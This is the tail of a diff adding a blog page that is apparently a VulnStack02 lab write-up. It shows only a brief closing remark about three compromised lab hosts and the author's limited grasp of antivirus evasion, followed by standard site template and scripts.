+<p>最终结果上线三台主机：</p>
+<p><img src="/2022/04/13/VulnStack02/Untitled28.png" alt="Untitled"></p>
+<p>免杀这一块了解的不够深。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/about/">Qui som</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/">Projectes</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VulnStack02"><span class="toc-number">1.</span> <span class="toc-text">VulnStack02</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E6%89%93%E9%9D%B6"><span class="toc-number">1.2.</span> <span class="toc-text">正式打靶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x01 信息收集</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://givemefivw.github.io/VulnStack02.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://givemefivw.github.io/VulnStack02.html&text=VulnStack02"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://givemefivw.github.io/VulnStack02.html&is_video=false&description=VulnStack02"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnStack02&body=Check out this article: https://givemefivw.github.io/VulnStack02.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://givemefivw.github.io/VulnStack02.html&title=VulnStack02"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://givemefivw.github.io/VulnStack02.html&name=VulnStack02&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://givemefivw.github.io/VulnStack02.html&t=VulnStack02"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    givemefivw
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Inici</a></li><!--
+     --><!--
+       --><li><a href="/about/">Qui som</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/">Projectes</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
